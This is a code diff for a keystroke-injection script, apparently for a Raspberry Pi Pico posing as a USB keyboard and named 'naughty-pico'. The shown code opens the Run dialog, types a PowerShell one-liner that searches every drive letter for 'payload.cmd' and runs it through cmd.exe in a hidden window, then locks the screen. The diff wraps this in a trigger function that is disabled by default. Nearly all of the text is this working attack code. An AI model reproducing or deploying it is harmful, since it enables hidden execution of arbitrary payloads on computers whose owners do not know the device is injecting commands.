@@ -31,12 +31,17 @@ def tryOpen(file):#Try to open a file on all avaliable disks of the connected de
     zzz(0.1)
     guiKey(Keycode.R)
     zzz(0.1)
-    ps_command = f'powershell -Command "foreach ($d in [char[]](65..90)) {{ Start-Process cmd.exe -ArgumentList \'/c\', \\"$($d):\\\\{file}\\" -WindowStyle Hidden }}"'
+    ps_command = f'powershell -Command "foreach ($d in [char[]](65..90)) {{ Start-Process cmd.exe -ArgumentList \'/c\', \\"$($d):\\\\{file}\\" -WindowStyle Hidden }}" '
     sendStr(ps_command)
     enter()
+    
+def trigger(stat):
+    if (not stat): return
+    startup()
+    tryOpen("naughty-pico\payload.cmd")
+    zzz(0.1)
+    guiKey(Keycode.L)#Does: WIN + L (Goes to the login-screen)
 
-#Begin custom code (uncomment these example lines to make them work⚠️)
-# startup()
-# tryOpen("payload.cmd")
-# guiKey(Keycode.L)#Does: WIN + L (Goes to the login-screen)
-#End custom code
+
+#Use True to enable naughty-pico, use False to disable it.
+trigger(False)
